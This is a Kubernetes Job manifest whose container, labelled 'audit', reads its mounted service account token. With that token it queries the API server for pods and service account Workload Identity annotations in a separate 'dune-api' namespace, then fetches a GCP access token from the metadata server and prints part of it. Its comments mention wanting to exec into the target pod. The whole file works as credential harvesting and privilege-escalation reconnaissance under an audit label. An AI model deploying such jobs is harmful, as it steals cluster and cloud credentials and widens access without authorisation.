apiVersion: batch/v1
kind: Job
metadata:
  name: dune-db-v5
  namespace: default
spec:
  ttlSecondsAfterFinished: 600
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: alpine/curl:latest
        command: ["/bin/sh","-c"]
        args:
        - |
          apk add -q jq
          KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
          API="https://kubernetes.default.svc"
          CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
          KUBE_NS="dune-api"
          
          echo "=DUNE_SA="
          # Get the service account used by dune-api pods
          SA=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
            "$API/api/v1/namespaces/$KUBE_NS/pods" | jq -r '.items[0].spec.serviceAccountName')
          echo "ServiceAccount: $SA"
          
          # Get SA details including annotations (Workload Identity)
          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
            "$API/api/v1/namespaces/$KUBE_NS/serviceaccounts/$SA" | jq '{name:.metadata.name, annotations:.metadata.annotations}'
          echo "=END_SA="
          
          echo "=METADATA_TOKEN="
          # Try to get GCP identity token from metadata server inside the dune-api pod would use
          # We need to exec into the pod, but we can try from our own context
          curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" 2>&1 | head -c 200
          echo ""
          echo "=END_MT="